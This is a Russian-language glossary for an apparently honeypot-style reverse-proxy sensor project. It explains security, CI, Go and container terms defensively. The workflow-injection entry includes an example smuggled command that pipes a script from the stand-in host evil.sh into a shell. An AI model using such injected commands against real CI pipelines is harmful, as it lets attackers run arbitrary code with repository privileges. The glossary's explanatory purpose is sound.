# Глоссарий

**ABI (двоичный интерфейс)** — договорённость о том, как скомпилированный
машинный код вызывает другой машинный код: расположение данных в памяти,
соглашения о вызовах. Для Python важно, что пакеты с машинным кодом
(например, pydantic-core) собраны под ABI конкретной минорной версии: колесо
для 3.13 работает на любой 3.13.x, но не на 3.12 или 3.14.

**ADR (Architecture Decision Record)** — короткий документ об одном архитектурном
решении: контекст, решение, альтернативы, последствия. Нужен, чтобы через год
понимать, почему сделано именно так.

**Анализ достижимости** — проверка не «есть ли в зависимостях уязвимая
версия», а «вызывает ли наш код уязвимую функцию». Так работает govulncheck.
Сокращает шум: уязвимость в функции, которую мы не используем, не требует
срочной реакции.

**Аннотации типов** — указание в коде, какого типа переменная или что
возвращает функция. Python их не проверяет при запуске: это делает отдельный
инструмент (у нас mypy). Для читателя аннотации — половина документации:
видно, что функция принимает и что отдаёт, не читая её тело.

**ASGI** — соглашение о том, как веб-сервер разговаривает с Python-приложением.
Асинхронный преемник WSGI. У нас FastAPI — это приложение, uvicorn — сервер,
и между собой они говорят именно по ASGI. Поэтому FastAPI сам по себе
ничего не слушает: ему нужен сервер.

**Атака по времени (timing attack)** — извлечение секрета по времени ответа.
Обычное сравнение строк останавливается на первом несовпавшем символе, и по
тому, насколько дольше идёт сравнение, атакующий узнаёт, сколько первых
символов подписи он угадал, — и подбирает её посимвольно. Защита — функции
сравнения за постоянное время: `hmac.compare_digest`, `hmac.Equal`.

**Байткод Python (.pyc)** — промежуточная форма кода, в которую Python
переводит исходник перед выполнением. Обычно создаётся при первом импорте
и кешируется на диске. В наших образах файловая система только для чтения,
поэтому байткод компилируется заранее, при сборке. Формат байткода
одинаков внутри минорной версии Python.

**Build backend** — программа, которая превращает исходники Python-проекта
в устанавливаемый пакет (например, hatchling). Важно понимать: это чужой код,
который исполняется во время установки. Если его версия не закреплена,
при каждой сборке может исполниться новый, никем не проверенный код.

**CODEOWNERS** — файл, в котором записано, кто обязан ревьюить какие файлы.
GitHub сам назначает этих людей ревьюерами, а при включённой защите ветки
не даёт слить изменение без их одобрения.

**Changelog** — файл с человекочитаемым списком изменений по версиям:
что добавлено, что исправлено, что касается безопасности. Пишется для
пользователей продукта, а не для разработчиков, поэтому не повторяет
историю коммитов.

**CodeQL** — статический анализатор GitHub. Строит модель программы и отслеживает,
как данные из внешнего источника (HTTP-запрос, переменная окружения) доходят
до опасного места (SQL-запрос, путь к файлу, команда shell). Бесплатен для
публичных репозиториев.

**CORS preflight** — предварительный OPTIONS-запрос, который браузер отправляет
перед «нестандартным» межсайтовым запросом (с особыми заголовками или JSON-телом).
Если сервер не разрешил — основной запрос не уходит. Используем, чтобы приманки
нельзя было вызвать с чужого сайта.

**Canary-токен** — фальшивый секрет (ключ, токен, пароль), который существует
только как приманка. Его использование — однозначный признак атаки или утечки.

**Capabilities (Linux)** — права root, разрезанные на отдельные части:
открыть порт ниже 1024, сменить владельца файла, обойти права доступа,
загрузить модуль ядра и около сорока других. Контейнер по умолчанию
получает часть из них. `cap_drop: [ALL]` отнимает все.

**Conventional Commits** — соглашение о формате сообщения коммита:
`feat:` — новая возможность, `fix:` — исправление, `docs:` — документация.
Из этих префиксов машина сама выводит номер версии и составляет changelog.

**CVE** — идентификатор публично известной уязвимости вида CVE-2026-12345.
Общий язык, на котором сканеры, производители и бюллетени безопасности
говорят об одной и той же уязвимости.

**Deadline (срок операции)** — момент, после которого чтение или запись
в сетевом соединении завершается ошибкой, если данных нет. В отличие от
таймаута «на весь запрос», срок можно сдвигать перед каждой операцией:
так сенсор разрешает долгие загрузки, но не разрешает клиенту замолчать
посреди передачи дольше минуты.

**Dependabot** — встроенная в GitHub служба, которая присылает pull request
с обновлением зависимости. Плановые обновления — по расписанию, срочные —
как только для используемой версии опубликована уязвимость.

**Digest образа** — контрольная сумма содержимого образа контейнера,
вида `sha256:4337...`. В отличие от тега (`1.27`, `latest`), который владелец
может в любой момент переставить на другое содержимое, digest однозначно
указывает на конкретные байты. Мультиплатформенный digest указывает на
индекс — список образов под разные процессоры.

**Distroless** — минимальный образ контейнера без shell и пакетного менеджера:
только программа и библиотеки, без которых она не запустится. Название —
от «distribution», дистрибутив Linux. Меньше компонентов — меньше уязвимостей
и меньше инструментов у атакующего. Оба образа продукта построены на нём
(ADR-0014, ADR-0020); возврат к обычному образу ловит правило D6.

**Fail-open** — поведение при сбое, когда трафик проходит дальше без проверки.
Сохраняет доступность ценой временного отключения защиты. Противоположность —
fail-closed.

**Фаззинг (fuzzing)** — автоматический поиск входов, на которых код ломается.
Инструмент генерирует миллионы случайных и «испорченных» вариантов входных
данных, следит за падениями и сохраняет найденный пример. В Go встроен:
функции `FuzzXxx` в тестах. Применяем к коду, который разбирает данные
атакующего: маскированию путей и правке HTML.

**Форматтер** — инструмент, который приводит код к единому виду автоматически.
В отличие от линтера, не ищет ошибки: он убирает из ревью споры о стиле,
чтобы вы смотрели на смысл изменения, а не на отступы.

**GitHub Actions** — встроенная в GitHub система CI. Workflow — файл
в `.github/workflows/`, описывающий, когда и что запускать. Задание (job) —
набор шагов на одной виртуальной машине, раннере. Задания выполняются
параллельно, если одно не ждёт другое через `needs`.

**GITHUB_TOKEN** — токен, который GitHub автоматически выдаёт каждому
прогону workflow. По умолчанию может быть с правом записи в репозиторий,
поэтому права явно ограничиваются в `permissions`. Токен с правом записи
в скомпрометированном шаге — это право подменить код или релиз.

**Гонка данных (race condition)** — ситуация, когда две части программы
обращаются к одним данным одновременно и хотя бы одна из них пишет.
Результат становится непредсказуемым: программа может годами работать верно
и сломаться под нагрузкой. Go умеет искать такие места при запуске тестов
с флагом `-race` — это и есть детектор гонок.

**Горутина (goroutine)** — лёгкий параллельный поток выполнения в Go,
запускается словом `go`. Их можно создавать тысячами, но каждая занимает
память. Горутина, которая никогда не завершится, — утечка; утечка, которую
атакующий может вызывать своими запросами, — отказ в обслуживании.

**Graceful shutdown (корректное завершение)** — остановка сервиса, при которой
он перестаёт принимать новые запросы, но даёт закончиться уже начатым.
Противоположность — убийство процесса, при котором активные запросы клиентов
обрываются на полуслове. Для сенсора, стоящего в чужом трафике, это разница
между незаметным обновлением и всплеском ошибок у клиента.

**Граница доверия** — место, где данные переходят из менее доверенной зоны
в более доверенную. Именно там нужны проверки.

**Хеш коммита (SHA)** — уникальный идентификатор конкретного состояния кода
в git. Это не шифрование: он ничего не скрывает, но подделать другой код
с тем же хешем практически невозможно.

**HMAC** — стандартный способ подписать данные секретным ключом. Позволяет
проверить, что данные созданы владельцем ключа и не изменены.

**Homoglyph-атака** — подмена символа визуально неотличимым из другого
алфавита: латинская «a» заменяется кириллической «а». Читающий код человек
не видит разницы, а для компьютера это разные символы, то есть разные имена.
Защита — запрет не-ASCII символов в именах переменных, функций и импортов.

**Hop-by-hop заголовки** — заголовки, которые относятся к одному соединению,
а не к запросу целиком: `Connection`, `Keep-Alive`, `Proxy-Authorization`,
`Upgrade` и перечисленные в `Connection`. Прокси обязан удалить их, прежде
чем передать запрос дальше. `Proxy-Authorization` среди них — учётные
данные для прокси не должны уйти приложению.

**Хук git (git hook)** — скрипт, который git запускает сам в определённый
момент: перед созданием коммита (pre-commit), после ввода сообщения
(commit-msg), перед отправкой (pre-push). Хуки не передаются через
клонирование и не включаются сами — иначе клонирование чужого репозитория
запускало бы чужой код. Обходятся флагом `--no-verify`, поэтому годятся
для ранней обратной связи, но не как граница безопасности.

**Инъекция в workflow** — выполнение команд атакующего через данные события
GitHub: заголовок PR, имя ветки, текст комментария. Возникает, когда такое
значение подставляется в скрипт через `${{ }}` — подстановка происходит
до запуска, и заголовок вида `"; curl evil.sh | sh; "` становится частью
команды. Защита — передавать значения через переменные окружения.

Вторая разновидность — через лог. Строка лога, начинающаяся с `::`,
например `::add-mask::` или `::error::`, — это команда раннеру GitHub Actions.
Если скрипт печатает в лог текст автора PR как есть (сообщение коммита,
имя файла), автор может отдать раннеру свою команду. Защита — печатать
такой текст в кавычках, так чтобы он никогда не начинал строку.

**JA4** — отпечаток TLS-клиента по параметрам рукопожатия. Помогает отличать
браузеры от скриптов и узнавать один и тот же инструмент при смене IP.

**Канал (Go)** — труба для передачи значений между горутинами. У канала есть
ёмкость; запись в заполненный канал останавливает пишущего, пока кто-то
не прочитает. Поэтому сенсор пишет события в канал неблокирующей записью:
если места нет, событие отбрасывается и учитывается счётчиком потерь.

**Keep-alive** — повторное использование одного TCP-соединения для нескольких
HTTP-запросов подряд. Экономит время на установку соединения, но означает,
что состояние соединения (например, выставленные сроки) переживает запрос
и должно сбрасываться между запросами.

**Колесо (wheel)** — готовый к установке пакет Python: архив с уже
собранными файлами, иногда с машинным кодом под конкретную платформу
и версию Python. Установка колеса не исполняет код пакета, в отличие
от сборки из исходников, — поэтому образ собирается с `--only-binary`.

**Коммит (commit)** — сохранённое состояние проекта с описанием, что и зачем
изменено. Единица истории: любой коммит можно посмотреть отдельно и откатить.
Хорошее сообщение коммита отвечает на «почему», а не на «что» — «что» видно
из самих изменений.

**Конфликт зависимостей** — ситуация, когда два компонента требуют одну
и ту же библиотеку в несовместимых версиях. В Go внутри одного модуля
выбирается максимальная из требуемых версий, и компонент, рассчитанный
на старую, может перестать компилироваться.

**Контекст сборки** — всё, что Docker отправляет сборщику образа. Любой
файл из контекста можно по ошибке скопировать в образ командой COPY,
поэтому состав контекста задаётся списком разрешённого в `.dockerignore`.

**Lock-файл** — файл с точными версиями всех зависимостей и их контрольными
суммами (`go.sum`, `uv.lock`). Без него сборка сегодня и через месяц может дать
разный результат, а подмена пакета в реестре пройдёт незаметно.

**Линтер** — инструмент, который ищет в коде подозрительные места, не запуская
его: необработанную ошибку, неиспользуемую переменную, опасный вызов. Отличие
от SAST условно: линтер больше про качество кода, SAST — про уязвимости.
В CI нужны оба.

**Ловушка (trap)** — часть приманки, где касание фиксируется: путь, запрос
на который означает, что атакующий нашёл наживку. Легитимный пользователь
в ловушку не приходит, потому что не видит наживки. Ловушка может отвечать
правдоподобной фейковой страницей, чтобы атакующий продолжил и выдал больше.

**Merge (слияние)** — перенос изменений из одной ветки в другую, у нас всегда
из рабочей ветки в `main`. Момент слияния — это момент, когда владелец говорит
«принимаю». Три способа отличаются тем, что остаётся в истории: *merge commit*
сохраняет все коммиты ветки и добавляет коммит-слияние, *squash* склеивает их
в один, *rebase* переносит без коммита-слияния. Когда в ветке несколько
логических шагов, нужен merge commit — иначе разделение на шаги исчезает.

**Middleware (обёртка обработчика)** — функция, которая принимает обработчик
HTTP-запросов и возвращает новый, добавляя проверку до или после исходного.
Цепочка обёрток задаёт порядок проверок, и этот порядок важен: ограничение
размера должно стоять до разбора, а fail-open — снаружи кода, который
может упасть.

**mTLS** — TLS, в котором сертификат предъявляют обе стороны, а не только сервер.
Защищает канал и взаимно аутентифицирует стороны.

**Монорепозиторий** — один репозиторий для всех компонентов продукта.
Позволяет менять общий контракт сразу во всех компонентах одним PR,
вместо того чтобы синхронизировать несколько репозиториев.

**Multi-stage build** — сборка образа в несколько стадий. В первой есть
компилятор и исходники, во вторую копируется только готовый результат.
Итоговый образ не содержит ничего, что нужно было только для сборки.

**Наживка (lure)** — часть приманки, которую видит атакующий: строка
в robots.txt, HTML-комментарий, заголовок ответа, скрытая ссылка. Сама
по себе ничего не фиксирует — ведёт к ловушке. Разные наживки ведут
к разным ловушкам, поэтому по событию видно, что именно прочитал атакующий.

**no-new-privileges** — настройка контейнера, запрещающая процессу получить
права больше, чем были у него при старте, например через файл с битом setuid.

**Нулевое значение (Go)** — значение переменной, которой ничего не присвоили:
`0`, `""`, `false`, `nil`. Важно для безопасности: нулевой таймаут в
`http.Server` означает «ждать бесконечно», поэтому все таймауты в продукте
задаются явно.

**Обязательная проверка (required check)** — проверка CI, без успешного
результата которой GitHub не даёт слить PR. Настраивается в защите ветки.
Пропущенное задание не сообщает о себе вовсе, поэтому обязательной делают
одну итоговую проверку, которая всегда запускается и учитывает остальные.

**OpenAPI** — машинно-читаемое описание HTTP API: какие есть эндпоинты,
какие принимают параметры, что возвращают. FastAPI генерирует его
автоматически и по умолчанию публикует на /openapi.json и /docs. Удобно
при разработке и одновременно — готовая карта продукта для атакующего,
поэтому у нас выключено по умолчанию.

**Открытый прокси** — прокси, который по просьбе клиента соединяется
с любым адресом. Для сенсора это катастрофа: через него атакующий попадает
во внутреннюю сеть клиента. Защита — адрес приложения берётся только
из конфигурации, а метод `CONNECT` отвергается (угроза T17).

**Паника (panic)** — аварийная остановка горутины в Go: обращение к `nil`,
выход за границы среза. Неперехваченная паника в горутине роняет весь процесс.
Перехватывается через `recover`; на этом построен fail-open сенсора: паника
в коде приманок не должна мешать запросу дойти до приложения.

**Партиционирование** — разбиение большой таблицы на части (например, по дням).
Старые данные удаляются целыми частями — быстро и без нагрузки.

**Перехват TLS (MITM-прокси)** — прокси, который расшифровывает HTTPS-трафик,
предъявляя клиенту свой сертификат вместо сертификата сайта. Корпоративные
прокси делают это для инспекции трафика. Клиент, не знающий сертификата
прокси, правильно отказывается подключаться: для него это атака «человек
посередине».

**Пиннинг (закрепление версии)** — ссылка на внешний компонент по неизменяемому
идентификатору: полному хешу коммита для GitHub Action, digest для образа
контейнера. Тег вроде `v4` или `latest` автор может молча переписать на другой
код, хеш — нет.

**Покрытие тестами (coverage)** — доля строк кода, выполненных во время тестов.
Важно помнить ограничение: это метрика «что выполнилось», а не «что проверено».
Код можно выполнить тестом, который ничего не утверждает, и получить 100 %.

**Политика обнаружения** — данные, которые говорят сенсору, что искать:
какие приманки включены, их пути и тексты, собственные правила
администратора. JSON-документ с версией схемы, а не код. Редактируется
в веб-интерфейсе (с этапа 5), до этого — в файле (ADR-0018). Отличается
от слоя запуска, который задаётся при развёртывании.

**Принцип Керкгоффса** — правило из криптографии: система должна оставаться
стойкой, даже если атакующему известно всё её устройство, кроме ключа.
У нас из него следует, что публиковать код можно, а секретом остаётся
конфигурация приманок конкретного клиента.

**Проверка живости и готовности (liveness, readiness)** — две разные проверки
состояния сервиса. Живость отвечает на вопрос «нужно ли перезапустить
процесс», готовность — «можно ли слать сюда трафик». Во время остановки
сервис жив, но не готов: перезапускать его не надо, а трафик надо увести.
Смешение этих двух проверок приводит к бесконечным перезапускам здорового
сервиса.

**Pull request (PR)** — предложение влить изменения из ветки, вместе с местом
для обсуждения. Пока PR не слит, изменения существуют «сбоку»: видны и
обсуждаемы, но в основной версии продукта их нет. Вкладка Commits позволяет
читать PR по одному шагу за раз, вкладка Files changed — всё полотно сразу.

**pull_request_target** — событие GitHub Actions, запускающее workflow
в контексте основного репозитория, с его секретами и токеном на запись,
но для кода из pull request. Для PR из форка это значит: чужой код
с нашими правами. В проекте не используется.

**RE2 и ReDoS** — ReDoS (отказ в обслуживании через регулярное выражение):
у многих движков регулярных выражений время работы на неудачном шаблоне
растёт экспоненциально от длины строки, и одна строка вешает процессор.
RE2 — движок с гарантированно линейным временем; на нём построен пакет Go
`regexp`. Поэтому в политике допустимы только выражения Go.

**Request smuggling** — атака на цепочку из прокси и приложения, которые
по-разному определяют, где кончается запрос: один смотрит на `Content-Length`,
другой на `Transfer-Encoding`. Атакующий прячет внутри одного запроса второй,
который прокси не видит, а приложение выполняет. Защита сенсора — разобрать
запрос самому и отправить приложению заново собранный (угроза T18).

**Reverse proxy** — сервер, который принимает запросы вместо приложения
и пересылает их ему. Так работает наш сенсор.

**Режим наблюдения** — правило включено, но только записывает «сработало бы»,
а запрос уходит в приложение как обычно. Так новое правило проверяют
на реальном трафике: не ловит ли оно легитимных пользователей.

**tmpfs** — файловая система в оперативной памяти. Содержимое исчезает
при перезапуске контейнера. Используется для временных файлов, когда
остальная файловая система контейнера доступна только для чтения.

**Ruleset (правила ветки)** — набор правил GitHub для веток: запрет прямого
push, обязательные проверки, запрет force push и удаления. В отличие от
классической защиты ветки, экспортируется в JSON и импортируется обратно,
поэтому правила можно хранить в репозитории и ревьюить как код.

**Ветка (branch)** — независимая линия разработки. Работа идёт в отдельной
ветке, чтобы незаконченные изменения не попадали в основную версию продукта.
Основная ветка у нас называется `main`.

**SameSite** — атрибут cookie, который ограничивает её отправку в межсайтовых
запросах. Значения: Strict, Lax, None.

**SAST** — статический анализ исходного кода на уязвимости без запуска
(CodeQL, Semgrep).

**SBOM** — список всех компонентов и зависимостей, из которых собран продукт.
Позволяет быстро понять, затронула ли нас новая уязвимость в библиотеке.

**SCA (Software Composition Analysis)** — проверка зависимостей на известные
уязвимости. SAST смотрит наш собственный код, SCA — чужой, который мы к себе
подключили. Нужны оба: большая часть кода в любом продукте — чужая.

**Sec-Fetch-Site** — заголовок, который браузер сам добавляет к запросу
и который нельзя подделать скриптом страницы. Показывает источник запроса:
same-origin, same-site, cross-site, none.

**Семафор** — счётчик свободных мест. Занять место можно, только если оно
есть; иначе приходится ждать, пока кто-то освободит. Предел соединений
сенсора — семафор: канал Go ёмкостью `SENSOR_MAX_CONNS`.

**SemVer (семантическое версионирование)** — формат номера версии
`МАЖОРНАЯ.МИНОРНАЯ.ПАТЧ`. Мажорная меняется при несовместимом изменении,
минорная — при новой совместимой возможности, патч — при исправлении.

**SLSA** — фреймворк уровней защиты цепочки поставок ПО: от сборки
до подписи артефактов.

**Slowloris** — атака на исчерпание ресурсов: злоумышленник открывает много
соединений и отправляет запрос предельно медленно, по байту, не закрывая
соединение. Каждое такое соединение занимает память и поток сервера, оставаясь
формально корректным. Защита — таймауты на чтение заголовков и тела запроса.

**Слой запуска (bootstrap)** — настройки, без которых сенсор не может начать
работу и которые задают границы доверия: адрес приложения, доверенные
прокси, адрес control plane, ключи проверки подписи. Задаются при
развёртывании и не редактируются из веб-интерфейса (ADR-0018).

**Smoke-тест** — самая быстрая проверка, «не идёт ли дым»: сервис поднялся
и отвечает на запрос. Логику не проверяет, зато мгновенно ловит полностью
сломанную сборку.

**SPA и серверный рендеринг** — два способа строить веб-приложение.
В SPA (single-page application) сервер отдаёт почти пустой HTML, а страницы
рисует JavaScript в браузере, общаясь с API (Juice Shop). При серверном
рендеринге сервер присылает готовый HTML с формами (VulnBank). Для сенсора
разница существенна: правка HTML и приманки в формах работают по-разному.

**SSRF (Server-Side Request Forgery)** — уязвимость, при которой атакующий
заставляет сервер сделать запрос по выбранному адресу: во внутреннюю сеть,
к облачным метаданным `169.254.169.254`, к локальным сервисам. Атакующий
получает доступ туда, куда сам дотянуться не может.

**STRIDE** — модель категорий угроз: Spoofing, Tampering, Repudiation,
Information disclosure, Denial of service, Elevation of privilege.

**Табличный тест** — тест в виде таблицы случаев («вход — ожидаемый результат»)
и одного цикла, который их проверяет. Таблицу можно читать как
спецификацию поведения без знания языка. Основной стиль тестов в сенсоре.

**Taint-анализ (отслеживание заражённых данных)** — способ поиска уязвимостей:
данные из опасного источника помечаются как «заражённые», и анализатор следит,
куда они попадают — через переменные, функции, преобразования. Если
заражённые данные дошли до опасного места, это находка. Так наши правила
Semgrep находят заголовок, сохранённый в переменную и записанный в лог позже.

**Tarpit** — намеренное замедление ответов атакующему, чтобы тратить
его время и ресурсы.

**Выдержка перед обновлением (cooldown)** — правило «не брать новую версию
зависимости раньше, чем через N дней после её выхода». Вредоносные релизы,
выпущенные с украденной учётной записи сопровождающего, обычно обнаруживают
и отзывают за несколько дней. На срочные обновления безопасности выдержка
не действует.

**WebSocket** — постоянный двусторонний канал между браузером и сервером
поверх HTTP-соединения: запрос с заголовком `Upgrade`, ответ `101 Switching
Protocols`, дальше обмен без HTTP. Прокси должен уметь передать такое
соединение целиком; Juice Shop использует его для уведомлений.
